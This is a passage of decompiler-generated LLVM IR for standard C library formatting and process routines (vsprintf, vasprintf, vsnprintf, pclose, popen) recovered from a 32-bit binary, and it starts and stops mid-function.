  %v2_805a9d8 = load i32, i32* %v1_805a9d8, align 4
  %v11_805a9d8 = icmp eq i32 %v2_805a9d8, 20
  %v1_805a9db = icmp eq i1 %v11_805a9d8, false
  br i1 %v1_805a9db, label %dec_label_pc_805a9eb, label %dec_label_pc_805a9dd

dec_label_pc_805a9dd:                             ; preds = %dec_label_pc_805a9d8
  %v0_805a9dd = load i32, i32* @edi, align 4
  store i32 %v0_805a9dd, i32* %v1_805a9d8, align 4
  %v0_805a9df = load i32, i32* %esi.global-to-local, align 4
  %v2_805a9e3 = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_805a9e3, i32* @ebx, align 4
  store i32 %v0_805a9b9, i32* %esi.global-to-local, align 4
  store i32 %v0_805a9b8, i32* @edi, align 4
  %v1_805a9e6 = call i32 @unlink(i32 %v0_805a9df)
  br label %dec_label_pc_805a9eb

dec_label_pc_805a9eb:                             ; preds = %dec_label_pc_805a9d8, %entry, %dec_label_pc_805a9dd
  %v0_805a9ee = phi i32 [ %v1_805a9cc, %dec_label_pc_805a9d8 ], [ %v1_805a9cc, %entry ], [ %v1_805a9e6, %dec_label_pc_805a9dd ]
  %v2_805a9eb = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_805a9eb, i32* @ebx, align 4
  store i32 %v0_805a9b9, i32* @esi, align 4
  store i32 %v0_805a9b8, i32* @edi, align 4
  ret i32 %v0_805a9ee

; uselistorder directives
  uselistorder i32 %v1_805a9bb, { 1, 0 }
  uselistorder i32 %v0_805a9b9, { 1, 0 }
  uselistorder i32 %v0_805a9b8, { 1, 0 }
  uselistorder label %dec_label_pc_805a9eb, { 2, 0, 1 }
}

declare i32 @printf(i8*, ...) local_unnamed_addr

define i32 @vsprintf(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %v4_805aa21 = inttoptr i32 %arg1 to i8*
  %v5_805aa21 = call i32 @__GI_vsnprintf(i8* %v4_805aa21, i32 -1, i32 %arg2, i32 %arg3)
  ret i32 %v5_805aa21
}

define i32 @fprintf(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %stack_var_12 = alloca i32, align 4
  %v2_805aa2f = ptrtoint i32* %stack_var_12 to i32
  %v0_805aa37 = load i32, i32* @edx, align 4
  %v4_805aa41 = inttoptr i32 %arg1 to i16*
  %v5_805aa41 = call i32 @__GI_vfprintf(i16* %v4_805aa41, i32 %arg2, i32 %v2_805aa2f, i32 %v0_805aa37)
  ret i32 %v5_805aa41
}

define i32 @__GI_snprintf(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %stack_var_16 = alloca i32, align 4
  %v2_805aa4f = ptrtoint i32* %stack_var_16 to i32
  %v4_805aa64 = inttoptr i32 %arg1 to i8*
  %v5_805aa64 = call i32 @__GI_vsnprintf(i8* %v4_805aa64, i32 %arg2, i32 %arg3, i32 %v2_805aa4f)
  ret i32 %v5_805aa64
}

define i32 @__GI_asprintf(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %stack_var_12 = alloca i32, align 4
  %v2_805aa73 = ptrtoint i32* %stack_var_12 to i32
  %v0_805aa7b = load i32, i32* @edx, align 4
  %v4_805aa85 = inttoptr i32 %arg1 to i32*
  %v5_805aa85 = call i32 @__GI_vasprintf(i32* %v4_805aa85, i32 %arg2, i32 %v2_805aa73, i32 %v0_805aa7b)
  ret i32 %v5_805aa85
}

define i32 @sprintf(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %stack_var_12 = alloca i32, align 4
  %v2_805aa93 = ptrtoint i32* %stack_var_12 to i32
  %v4_805aaa6 = inttoptr i32 %arg1 to i8*
  %v5_805aaa6 = call i32 @__GI_vsnprintf(i8* %v4_805aaa6, i32 -1, i32 %arg2, i32 %v2_805aa93)
  ret i32 %v5_805aaa6
}

define i32 @__GI_vasprintf(i32* %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %tmp2 = ptrtoint i32* %arg1 to i32
  %stack_var_-44 = alloca i32, align 4
  %tmp10 = call i32 @__decompiler_undefined_function_0()
  store i32 %tmp10, i32* %stack_var_-44, align 4
  %stack_var_-16 = alloca i32, align 4
  %v0_805aab2 = load i32, i32* @esi, align 4
  %v0_805aab3 = load i32, i32* @ebx, align 4
  store i32 %v0_805aab3, i32* %stack_var_-16, align 4
  store i32 %arg3, i32* @esi, align 4
  store i32 %arg2, i32* @ebp, align 4
  store i32 %tmp2, i32* @edi, align 4
  %v5_805aacd = call i32 @__GI_vsnprintf(i8* null, i32 0, i32 %arg3, i32 %tmp10)
  store i32 %v5_805aacd, i32* @ebx, align 4
  %v0_805aad7 = load i32, i32* @edi, align 4
  %v1_805aad7 = inttoptr i32 %v0_805aad7 to i32*
  store i32 0, i32* %v1_805aad7, align 4
  %v2_805aadd = icmp slt i32 %v5_805aacd, 0
  br i1 %v2_805aadd, label %dec_label_pc_805ab19, label %dec_label_pc_805aae1

dec_label_pc_805aae1:                             ; preds = %entry
  %v0_805aae4 = load i32, i32* @ebx, align 4
  %v1_805aae4 = add i32 %v0_805aae4, 1
  store i32 %v1_805aae4, i32* @ebx, align 4
  %v1_805aae6 = call i32 @malloc(i32 %v1_805aae4)
  %v1_805aaee = load i32, i32* @edi, align 4
  %v2_805aaee = inttoptr i32 %v1_805aaee to i32*
  store i32 %v1_805aae6, i32* %v2_805aaee, align 4
  %v1_805aaf0 = icmp eq i32 %v1_805aae6, 0
  br i1 %v1_805aaf0, label %dec_label_pc_805ab19, label %dec_label_pc_805aaf4

dec_label_pc_805aaf4:                             ; preds = %dec_label_pc_805aae1
  %v0_805aaf4 = load i32, i32* @esi, align 4
  %v0_805aaf6 = load i32, i32* @ebx, align 4
  %v3_805aaf8 = load i32, i32* %stack_var_-44, align 4
  %v4_805aaf8 = inttoptr i32 %v1_805aae6 to i8*
  %v5_805aaf8 = call i32 @__GI_vsnprintf(i8* %v4_805aaf8, i32 %v0_805aaf6, i32 %v0_805aaf4, i32 %v3_805aaf8)
  store i32 %v5_805aaf8, i32* @ebx, align 4
  %v2_805ab02 = icmp slt i32 %v5_805aaf8, 0
  %v1_805ab04 = icmp eq i1 %v2_805ab02, false
  br i1 %v1_805ab04, label %dec_label_pc_805ab19, label %dec_label_pc_805ab06

dec_label_pc_805ab06:                             ; preds = %dec_label_pc_805aaf4
  %v0_805ab09 = load i32, i32* @edi, align 4
  %v1_805ab09 = inttoptr i32 %v0_805ab09 to i32*
  %v2_805ab09 = load i32, i32* %v1_805ab09, align 4
  %v1_805ab0b = call i32 @free(i32 %v2_805ab09)
  %v0_805ab10 = load i32, i32* @edi, align 4
  %v1_805ab10 = inttoptr i32 %v0_805ab10 to i32*
  store i32 0, i32* %v1_805ab10, align 4
  br label %dec_label_pc_805ab19

dec_label_pc_805ab19:                             ; preds = %dec_label_pc_805aaf4, %dec_label_pc_805aae1, %entry, %dec_label_pc_805ab06
  %v0_805ab1c = load i32, i32* @ebx, align 4
  %v2_805ab1e = load i32, i32* %stack_var_-16, align 4
  store i32 %v2_805ab1e, i32* @ebx, align 4
  store i32 %v0_805aab2, i32* @esi, align 4
  ret i32 %v0_805ab1c

; uselistorder directives
  uselistorder i32 %v5_805aaf8, { 1, 0 }
  uselistorder i32 %v1_805aae6, { 1, 0, 2 }
  uselistorder i32* %stack_var_-44, { 1, 0 }
  uselistorder i32 (i8*, i32, i32, i32)* @__GI_vsnprintf, { 0, 1, 3, 2, 4 }
  uselistorder label %dec_label_pc_805ab19, { 3, 0, 1, 2 }
}

define i32 @__GI_vsnprintf(i8* %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %stack_var_-96 = alloca i32, align 4
  %stack_var_-40 = alloca i32, align 4
  %stack_var_-16 = alloca i32, align 4
  %v0_805ab24 = load i32, i32* @ebp, align 4
  %v0_805ab25 = load i32, i32* @edi, align 4
  %v0_805ab26 = load i32, i32* @esi, align 4
  %v0_805ab27 = load i32, i32* @ebx, align 4
  store i32 %v0_805ab27, i32* %stack_var_-16, align 4
  %v4_805ab2b = ptrtoint i8* %arg1 to i32
  store i32 %v4_805ab2b, i32* @esi, align 4
  %v2_805ab2f = ptrtoint i32* %stack_var_-40 to i32
  store i32 %arg2, i32* @edi, align 4
  store i32 208, i32* %stack_var_-96, align 4
  %v2_805ab60 = ptrtoint i32* %stack_var_-96 to i32
  store i32 %v2_805ab60, i32* @ebp, align 4
  %v1_805ab64 = sub i32 -1, %v4_805ab2b
  store i32 %v1_805ab64, i32* @ebx, align 4
  %v1_805ab67 = call i32 @__stdio_init_mutex(i32 %v2_805ab2f)
  %v0_805ab77 = load i32, i32* @ebx, align 4
  %v1_805ab77 = load i32, i32* @edi, align 4
  %tmp = icmp ugt i32 %v0_805ab77, %v1_805ab77
  br i1 %tmp, label %dec_label_pc_805ab7b, label %dec_label_pc_805ab7d

dec_label_pc_805ab7b:                             ; preds = %entry
  store i32 %v1_805ab77, i32* @ebx, align 4
  br label %dec_label_pc_805ab7d

dec_label_pc_805ab7d:                             ; preds = %entry, %dec_label_pc_805ab7b
  %v1_805ab7d = phi i32 [ %v0_805ab77, %entry ], [ %v1_805ab77, %dec_label_pc_805ab7b ]
  %v0_805ab7d = load i32, i32* @esi, align 4
  %v2_805ab7d = add i32 %v0_805ab7d, %v1_805ab7d
  %v4_805aba8 = inttoptr i32 %arg3 to i8*
  %v5_805aba8 = call i32 @_vfprintf_internal(i32 %v2_805ab60, i8* %v4_805aba8, i32 %arg4, i32 %v2_805ab7d)
  store i32 %v5_805aba8, i32* @edx, align 4
  %v0_805abb2 = load i32, i32* @ebx, align 4
  %v1_805abb2 = icmp eq i32 %v0_805abb2, 0
  br i1 %v1_805abb2, label %dec_label_pc_805abcc, label %dec_label_pc_805abb6

dec_label_pc_805abb6:                             ; preds = %dec_label_pc_805ab7d
  %v16_805abba = icmp eq i32 %v1_805ab7d, 0
  %v1_805abbe = icmp eq i1 %v16_805abba, false
  br i1 %v1_805abbe, label %dec_label_pc_805abc5, label %dec_label_pc_805abc0

dec_label_pc_805abc0:                             ; preds = %dec_label_pc_805abb6
  %v1_805abc0 = add i32 %v2_805ab7d, -1
  br label %dec_label_pc_805abc5

dec_label_pc_805abc5:                             ; preds = %dec_label_pc_805abb6, %dec_label_pc_805abc0
  %stack_var_-80.0.in = phi i32 [ %v0_805ab7d, %dec_label_pc_805abb6 ], [ %v1_805abc0, %dec_label_pc_805abc0 ]
  %stack_var_-80.0 = inttoptr i32 %stack_var_-80.0.in to i8*
  store i8 0, i8* %stack_var_-80.0, align 1
  %v0_805abcf.pre = load i32, i32* @edx, align 4
  br label %dec_label_pc_805abcc

dec_label_pc_805abcc:                             ; preds = %dec_label_pc_805ab7d, %dec_label_pc_805abc5
  %v0_805abcf = phi i32 [ %v5_805aba8, %dec_label_pc_805ab7d ], [ %v0_805abcf.pre, %dec_label_pc_805abc5 ]
  %v2_805abd1 = load i32, i32* %stack_var_-16, align 4
  store i32 %v2_805abd1, i32* @ebx, align 4
  store i32 %v0_805ab26, i32* @esi, align 4
  store i32 %v0_805ab25, i32* @edi, align 4
  store i32 %v0_805ab24, i32* @ebp, align 4
  ret i32 %v0_805abcf

; uselistorder directives
  uselistorder i32 %v0_805ab7d, { 1, 0 }
  uselistorder i32 %v1_805ab7d, { 1, 0 }
  uselistorder i32 %v1_805ab77, { 1, 2, 0 }
  uselistorder i32 %v0_805ab77, { 1, 0 }
  uselistorder i32* %stack_var_-96, { 1, 0 }
  uselistorder label %dec_label_pc_805abcc, { 1, 0 }
  uselistorder label %dec_label_pc_805abc5, { 1, 0 }
  uselistorder label %dec_label_pc_805ab7d, { 1, 0 }
}

define i32 @pclose(i32 %arg1) local_unnamed_addr {
entry:
  %stack_var_-16 = alloca i32, align 4
  %stack_var_-60 = alloca i32, align 4
  %stack_var_-32 = alloca i32, align 4
  %stack_var_-12 = alloca i32, align 4
  %v0_805abd8 = load i32, i32* @edi, align 4
  %v0_805abd9 = load i32, i32* @esi, align 4
  %v0_805abda = load i32, i32* @ebx, align 4
  store i32 %v0_805abda, i32* %stack_var_-12, align 4
  store i32 %arg1, i32* @edi, align 4
  %v2_805abec = ptrtoint i32* %stack_var_-32 to i32
  store i32 %v2_805abec, i32* %stack_var_-60, align 4
  %v4_805abf1 = call i32 @__pthread_cleanup_push_defer(i32* nonnull %stack_var_-32, i32 134583465, i32 ptrtoint (i32* @global_var_807a66c.724 to i32))
  store i32 ptrtoint (i32* @global_var_807a66c.724 to i32), i32* %stack_var_-60, align 4
  %v1_805abfd = call i32 @pthread_mutex_lock(i32 ptrtoint (i32* @global_var_807a66c.724 to i32))
  %v0_805ac02 = load i32, i32* @global_var_807a684.725, align 4
  store i32 %v0_805ac02, i32* @ebx, align 4
  %v1_805ac0b = icmp eq i32 %v0_805ac02, 0
  br i1 %v1_805ac0b, label %dec_label_pc_805ac41, label %dec_label_pc_805ac0f

dec_label_pc_805ac0f:                             ; preds = %entry
  %v1_805ac0f = add i32 %v0_805ac02, 4
  %v2_805ac0f = inttoptr i32 %v1_805ac0f to i32*
  %v3_805ac0f = load i32, i32* %v2_805ac0f, align 4
  %v4_805ac0f = load i32, i32* @edi, align 4
  %v15_805ac0f = icmp eq i32 %v3_805ac0f, %v4_805ac0f
  %v1_805ac12 = icmp eq i1 %v15_805ac0f, false
  br i1 %v1_805ac12, label %dec_label_pc_805ac30, label %dec_label_pc_805ac14

dec_label_pc_805ac14:                             ; preds = %dec_label_pc_805ac0f
  %v1_805ac14 = inttoptr i32 %v0_805ac02 to i32*
  %v2_805ac14 = load i32, i32* %v1_805ac14, align 4
  store i32 %v2_805ac14, i32* @global_var_807a684.725, align 4
  br label %dec_label_pc_805ac41

dec_label_pc_805ac1d:                             ; preds = %dec_label_pc_805ac30
  %v0_805ac1d = load i32, i32* %stack_var_-60, align 4
  %v1_805ac1d = call i32 @__errno_location(i32 %v0_805ac1d)
  %v1_805ac22 = inttoptr i32 %v1_805ac1d to i32*
  store i32 22, i32* %v1_805ac22, align 4
  br label %dec_label_pc_805ac41

dec_label_pc_805ac2a:                             ; preds = %dec_label_pc_805ac6d
  %v3_805ac2a = load i32, i32* %stack_var_-16, align 4
  br label %dec_label_pc_805ac8f

dec_label_pc_805ac30:                             ; preds = %dec_label_pc_805ac0f, %dec_label_pc_805ac38
  %v1_805ac3f = phi i32 [ %v2_805ac32, %dec_label_pc_805ac38 ], [ %v0_805ac02, %dec_label_pc_805ac0f ]
  %v1_805ac32 = inttoptr i32 %v1_805ac3f to i32*
  %v2_805ac32 = load i32, i32* %v1_805ac32, align 4
  store i32 %v2_805ac32, i32* @ebx, align 4
  %v1_805ac34 = icmp eq i32 %v2_805ac32, 0
  br i1 %v1_805ac34, label %dec_label_pc_805ac1d, label %dec_label_pc_805ac38

dec_label_pc_805ac38:                             ; preds = %dec_label_pc_805ac30
  %v1_805ac38 = add i32 %v2_805ac32, 4
  %v2_805ac38 = inttoptr i32 %v1_805ac38 to i32*
  %v3_805ac38 = load i32, i32* %v2_805ac38, align 4
  %v15_805ac38 = icmp eq i32 %v3_805ac38, %v4_805ac0f
  %v1_805ac3b = icmp eq i1 %v15_805ac38, false
  br i1 %v1_805ac3b, label %dec_label_pc_805ac30, label %dec_label_pc_805ac3d

dec_label_pc_805ac3d:                             ; preds = %dec_label_pc_805ac38
  %v1_805ac3d = inttoptr i32 %v2_805ac32 to i32*
  %v2_805ac3d = load i32, i32* %v1_805ac3d, align 4
  store i32 %v2_805ac3d, i32* %v1_805ac32, align 4
  br label %dec_label_pc_805ac41

dec_label_pc_805ac41:                             ; preds = %entry, %dec_label_pc_805ac1d, %dec_label_pc_805ac14, %dec_label_pc_805ac3d
  store i32 %v2_805abec, i32* %stack_var_-60, align 4
  %v3_805ac4a = call i32 @__pthread_cleanup_pop_restore(i32* nonnull %stack_var_-32, i32 1)
  %v0_805ac52 = load i32, i32* @ebx, align 4
  %v1_805ac52 = icmp eq i32 %v0_805ac52, 0
  br i1 %v1_805ac52, label %dec_label_pc_805ac8c, label %dec_label_pc_805ac56

dec_label_pc_805ac56:                             ; preds = %dec_label_pc_805ac41
  %v1_805ac59 = add i32 %v0_805ac52, 8
  %v2_805ac59 = inttoptr i32 %v1_805ac59 to i32*
  %v3_805ac59 = load i32, i32* %v2_805ac59, align 4
  store i32 %v3_805ac59, i32* @esi, align 4
  store i32 %v0_805ac52, i32* %stack_var_-60, align 4
  %v1_805ac5d = call i32 @free(i32 %v0_805ac52)
  %v0_805ac62 = load i32, i32* @edi, align 4
  store i32 %v0_805ac62, i32* %stack_var_-60, align 4
  %v1_805ac65 = inttoptr i32 %v0_805ac62 to i16*
  %v2_805ac65 = call i32 @__GI_fclose(i16* %v1_805ac65)
  %v2_805ac70 = ptrtoint i32* %stack_var_-16 to i32
  br label %dec_label_pc_805ac6d

dec_label_pc_805ac6d:                             ; preds = %dec_label_pc_805ac82, %dec_label_pc_805ac56
  %v0_805ac6d = phi i32 [ %v1_805ac82, %dec_label_pc_805ac82 ], [ %v2_805ac65, %dec_label_pc_805ac56 ]
  %v0_805ac75 = load i32, i32* @esi, align 4
  store i32 %v0_805ac75, i32* %stack_var_-60, align 4
  %v4_805ac76 = call i32 @waitpid(i32 %v0_805ac75, i32 %v2_805ac70, i32 0, i32 %v0_805ac6d)
  %v2_805ac7e = icmp slt i32 %v4_805ac76, 0
  %v1_805ac80 = icmp eq i1 %v2_805ac7e, false
  br i1 %v1_805ac80, label %dec_label_pc_805ac2a, label %dec_label_pc_805ac82

dec_label_pc_805ac82:                             ; preds = %dec_label_pc_805ac6d
  %v0_805ac82 = load i32, i32* %stack_var_-60, align 4
  %v1_805ac82 = call i32 @__errno_location(i32 %v0_805ac82)
  %v1_805ac87 = inttoptr i32 %v1_805ac82 to i32*
  %v2_805ac87 = load i32, i32* %v1_805ac87, align 4
  %v11_805ac87 = icmp eq i32 %v2_805ac87, 4
  br i1 %v11_805ac87, label %dec_label_pc_805ac6d, label %dec_label_pc_805ac8c.loopexit

dec_label_pc_805ac8c.loopexit:                    ; preds = %dec_label_pc_805ac82
  br label %dec_label_pc_805ac8c

dec_label_pc_805ac8c:                             ; preds = %dec_label_pc_805ac8c.loopexit, %dec_label_pc_805ac41
  br label %dec_label_pc_805ac8f

dec_label_pc_805ac8f:                             ; preds = %dec_label_pc_805ac2a, %dec_label_pc_805ac8c
  %storemerge = phi i32 [ -1, %dec_label_pc_805ac8c ], [ %v3_805ac2a, %dec_label_pc_805ac2a ]
  %v2_805ac92 = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_805ac92, i32* @ebx, align 4
  store i32 %v0_805abd9, i32* @esi, align 4
  store i32 %v0_805abd8, i32* @edi, align 4
  ret i32 %storemerge

; uselistorder directives
  uselistorder i32 %v1_805ac82, { 1, 0 }
  uselistorder i32 %v0_805ac52, { 2, 1, 0, 3 }
  uselistorder i32 %v2_805ac32, { 0, 2, 3, 4, 1 }
  uselistorder i32* %stack_var_-60, { 1, 2, 3, 4, 5, 0, 6, 7 }
  uselistorder i32* %stack_var_-16, { 1, 0 }
  uselistorder i32 (i32, i32, i32, i32)* @waitpid, { 0, 3, 2, 4, 1 }
  uselistorder label %dec_label_pc_805ac8f, { 1, 0 }
  uselistorder label %dec_label_pc_805ac41, { 3, 1, 2, 0 }
  uselistorder label %dec_label_pc_805ac30, { 1, 0 }
}

define i32 @popen(i32 %arg1, i8* %arg2) local_unnamed_addr {
entry:
  %eax.global-to-local = alloca i32, align 4
  %edx.global-to-local = alloca i32, align 4
  %stack_var_-32 = alloca i32, align 4
  %stack_var_-16 = alloca i32, align 4
  %stack_var_-76 = alloca i32, align 4
  %stack_var_-72 = alloca i8*, align 4
  %stack_var_-60 = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v0_805ac96 = load i32, i32* @esi, align 4
  %v0_805ac97 = load i32, i32* @ebx, align 4
  store i32 %v0_805ac97, i32* %stack_var_-8, align 4
  %v15_805ac98 = ptrtoint i32* %stack_var_-60 to i32
  %v4_805ac9b = ptrtoint i8* %arg2 to i32
  store i32 %v4_805ac9b, i32* @ebx, align 4
  %v2_805ac9f = load i8, i8* %arg2, align 1
  %v3_805ac9f = zext i8 %v2_805ac9f to i32
  %v4_805ac9f = load i32, i32* @eax, align 4
  %v5_805ac9f = and i32 %v4_805ac9f, -256
  %v6_805ac9f = or i32 %v5_805ac9f, %v3_805ac9f
  store i32 %v6_805ac9f, i32* %eax.global-to-local, align 4
  %v10_805aca1 = icmp eq i8 %v2_805ac9f, 119
  br i1 %v10_805aca1, label %dec_label_pc_805acd0, label %dec_label_pc_805aca5

dec_label_pc_805aca5:                             ; preds = %entry
  %v10_805acad = icmp eq i8 %v2_805ac9f, 114
  br i1 %v10_805acad, label %dec_label_pc_805acd0, label %dec_label_pc_805acb1

dec_label_pc_805acb1:                             ; preds = %dec_label_pc_805aca5
  %v1_805acb1 = call i32 @__errno_location(i32 1)
  store i32 %v1_805acb1, i32* %eax.global-to-local, align 4
  %v1_805acb6 = inttoptr i32 %v1_805acb1 to i32*
  store i32 22, i32* %v1_805acb6, align 4
  store i32 0, i32* %stack_var_-60, align 4
  br label %dec_label_pc_805ae87

dec_label_pc_805acd0:                             ; preds = %entry, %dec_label_pc_805aca5
  %v0_805ad9e = phi i32 [ 1, %dec_label_pc_805aca5 ], [ 0, %entry ]
  store i32 12, i32* %stack_var_-76, align 4
  %v1_805acd5 = call i32 @malloc(i32 12)
  store i32 %v1_805acd5, i32* %eax.global-to-local, align 4
  %v1_805ace1 = icmp eq i32 %v1_805acd5, 0
  store i32 0, i32* %stack_var_-60, align 4
  br i1 %v1_805ace1, label %dec_label_pc_805ae87, label %dec_label_pc_805acf0

dec_label_pc_805acf0:                             ; preds = %dec_label_pc_805acd0
  %v2_805acf3 = ptrtoint i32* %stack_var_-16 to i32
  store i32 %v2_805acf3, i32* %eax.global-to-local, align 4
  store i32 %v2_805acf3, i32* %stack_var_-76, align 4
  %v1_805acf8 = call i32 @__GI_pipe(i32 %v2_805acf3)
  store i32 %v1_805acf8, i32* %eax.global-to-local, align 4
  %v1_805ad00 = icmp eq i32 %v1_805acf8, 0
  %v1_805ad02 = icmp eq i1 %v1_805ad00, false
  br i1 %v1_805ad02, label %dec_label_pc_805ae70, label %dec_label_pc_805ad08

dec_label_pc_805ad08:                             ; preds = %dec_label_pc_805acf0
  store i32 %v0_805ad9e, i32* %eax.global-to-local, align 4
  %tmp37 = sub nsw i32 0, %v0_805ad9e
  %v2_805ad0c = and i32 %tmp37, 4
  %v3_805ad0c = add i32 %v15_805ac98, 44
  %v4_805ad0c = add i32 %v3_805ad0c, %v2_805ad0c
  %v5_805ad0c = inttoptr i32 %v4_805ad0c to i32*
  %v6_805ad0c = load i32, i32* %v5_805ad0c, align 4
  %v5_805ad19 = xor i32 %v0_805ad9e, 1
  store i32 %v5_805ad19, i32* %eax.global-to-local, align 4
  %tmp38 = sub nsw i32 0, %v5_805ad19
  %v2_805ad1d = and i32 %tmp38, 4
  %v4_805ad1d = add i32 %v3_805ad0c, %v2_805ad1d
  %v5_805ad1d = inttoptr i32 %v4_805ad1d to i32*
  %v6_805ad1d = load i32, i32* %v5_805ad1d, align 4
  store i32 %v6_805ad1d, i32* %eax.global-to-local, align 4
  %v0_805ad25 = load i32, i32* @ecx, align 4
  %v0_805ad27 = load i32, i32* @ebx, align 4
  %v5_805ad27 = inttoptr i32 %v0_805ad27 to i8*
  store i8* %v5_805ad27, i8** %stack_var_-72, align 4
  store i32 %v6_805ad1d, i32* %stack_var_-76, align 4
  %v5_805ad29 = call i32 @fdopen(i32 %v6_805ad1d, i32 %v0_805ad27, i32 %v0_805ad25, i32 %v0_805ad25)
  store i32 %v5_805ad29, i32* %eax.global-to-local, align 4
  store i32 %v5_805ad29, i32* %stack_var_-60, align 4
  %v1_805ad35 = icmp eq i32 %v5_805ad29, 0
  %v1_805ad37 = icmp eq i1 %v1_805ad35, false
  br i1 %v1_805ad37, label %dec_label_pc_805ad54, label %dec_label_pc_805ad39

dec_label_pc_805ad39:                             ; preds = %dec_label_pc_805ad08
  store i32 %v6_805ad1d, i32* %stack_var_-76, align 4
  %v1_805ad40 = call i32 @__libc_close(i32 %v6_805ad1d)
  store i32 %v1_805ad40, i32* %eax.global-to-local, align 4
  %v2_805ad45 = load i32, i32* %stack_var_-76, align 4
  store i32 %v2_805ad45, i32* %edx.global-to-local, align 4
  store i32 %v6_805ad0c, i32* %stack_var_-76, align 4
  %v1_805ad4a = call i32 @__libc_close(i32 %v6_805ad0c)
  br label %dec_label_pc_805ae6d

dec_label_pc_805ad54:                             ; preds = %dec_label_pc_805ad08
  store i8* inttoptr (i32 134583465 to i8*), i8** %stack_var_-72, align 4
  %v2_805ad5f = ptrtoint i32* %stack_var_-32 to i32
  store i32 %v2_805ad5f, i32* %eax.global-to-local, align 4
  store i32 %v2_805ad5f, i32* %stack_var_-76, align 4
  %v5_805ad64 = call i32 @__pthread_cleanup_push_defer(i32* nonnull %stack_var_-32, i32 134583465, i32 ptrtoint (i32* @global_var_807a66c.724 to i32))
  store i32 %v5_805ad64, i32* %eax.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_807a66c.724 to i32), i32* %stack_var_-76, align 4
  %v1_805ad70 = call i32 @pthread_mutex_lock(i32 ptrtoint (i32* @global_var_807a66c.724 to i32))
  store i32 %v1_805ad70, i32* %eax.global-to-local, align 4
  %v0_805ad75 = load i32, i32* %stack_var_-76, align 4
  %v1_805ad75 = call i32 @__vfork(i32 %v0_805ad75)
  store i32 %v1_805ad75, i32* %eax.global-to-local, align 4
  store i32 %v1_805ad75, i32* @ebx, align 4
  %v1_805ad7f = icmp eq i32 %v1_805ad75, 0
  %v1_805ad81 = icmp eq i1 %v1_805ad7f, false
  br i1 %v1_805ad81, label %dec_label_pc_805adfb, label %dec_label_pc_805ad83

dec_label_pc_805ad83:                             ; preds = %dec_label_pc_805ad54
  store i32 %v6_805ad1d, i32* %stack_var_-76, align 4
  %v1_805ad8a = call i32 @__libc_close(i32 %v6_805ad1d)
  store i32 %v1_805ad8a, i32* %eax.global-to-local, align 4
  store i32 %v0_805ad9e, i32* %edx.global-to-local, align 4
  %v15_805ad96 = icmp eq i32 %v6_805ad0c, %v0_805ad9e
  br i1 %v15_805ad96, label %dec_label_pc_805adb5, label %dec_label_pc_805ad9c

dec_label_pc_805ad9c:                             ; preds = %dec_label_pc_805ad83
  %v5_805ad9e = inttoptr i32 %v0_805ad9e to i8*
  store i8* %v5_805ad9e, i8** %stack_var_-72, align 4
  store i32 %v6_805ad0c, i32* %stack_var_-76, align 4
  %v5_805ada3 = call i32 @dup2(i32 %v6_805ad0c, i32 %v0_805ad9e, i32 %v1_805ad8a, i32 %v1_805ad8a)
  %v2_805ada8 = load i32, i32* %stack_var_-76, align 4
  store i32 %v2_805ada8, i32* %eax.global-to-local, align 4
  store i32 %v6_805ad0c, i32* %stack_var_-76, align 4
  %v1_805adad = call i32 @__libc_close(i32 %v6_805ad0c)
  store i32 %v1_805adad, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_805adb5

dec_label_pc_805adb5:                             ; preds = %dec_label_pc_805ad83, %dec_label_pc_805ad9c
  %v0_805adb5 = load i32, i32* @global_var_807a684.725, align 4
  store i32 %v0_805adb5, i32* @ebx, align 4
  %v1_805add02 = icmp eq i32 %v0_805adb5, 0
  %v1_805add29 = icmp eq i1 %v1_805add02, false
  br i1 %v1_805add29, label %dec_label_pc_805adbd, label %dec_label_pc_805add4

dec_label_pc_805adbd:                             ; preds = %dec_label_pc_805adb5, %dec_label_pc_805adbd
  %v0_805adbd = phi i32 [ %v2_805adcb, %dec_label_pc_805adbd ], [ %v0_805adb5, %dec_label_pc_805adb5 ]
  %v1_805adbd = add i32 %v0_805adbd, 4
  %v2_805adbd = inttoptr i32 %v1_805adbd to i32*
  %v3_805adbd = load i32, i32* %v2_805adbd, align 4
  store i32 %v3_805adbd, i32* %eax.global-to-local, align 4
  %v1_805adc3 = add i32 %v3_805adbd, 4
  %v2_805adc3 = inttoptr i32 %v1_805adc3 to i32*
  %v3_805adc3 = load i32, i32* %v2_805adc3, align 4
  store i32 %v3_805adc3, i32* %stack_var_-76, align 4
  %v1_805adc6 = call i32 @__libc_close(i32 %v3_805adc3)
  store i32 %v1_805adc6, i32* %eax.global-to-local, align 4
  %v0_805adcb = load i32, i32* @ebx, align 4
  %v1_805adcb = inttoptr i32 %v0_805adcb to i32*
  %v2_805adcb = load i32, i32* %v1_805adcb, align 4
  store i32 %v2_805adcb, i32* @ebx, align 4
  %v1_805add0 = icmp eq i32 %v2_805adcb, 0
  %v1_805add2 = icmp eq i1 %v1_805add0, false
  br i1 %v1_805add2, label %dec_label_pc_805adbd, label %dec_label_pc_805add4

dec_label_pc_805add4:                             ; preds = %dec_label_pc_805adbd, %dec_label_pc_805adb5
  store i32 0, i32* %stack_var_-76, align 4
  %v8_805adec = call i32 @execl(i32 ptrtoint ([8 x i8]* @global_var_806cbab.728 to i32), i32 ptrtoint ([3 x i8]* @global_var_806cbb0.727 to i32), i32 ptrtoint ([3 x i8]* @global_var_806cba8.726 to i32), i32 %arg1, i32 0)
  store i32 %v8_805adec, i32* %eax.global-to-local, align 4
  store i32 127, i32* %stack_var_-76, align 4
  %v1_805adf6 = call i32 @__GI__exit(i32 127)
  unreachable

dec_label_pc_805adfb:                             ; preds = %dec_label_pc_805ad54
  store i8* inttoptr (i32 1 to i8*), i8** %stack_var_-72, align 4
  store i32 %v2_805ad5f, i32* %stack_var_-76, align 4
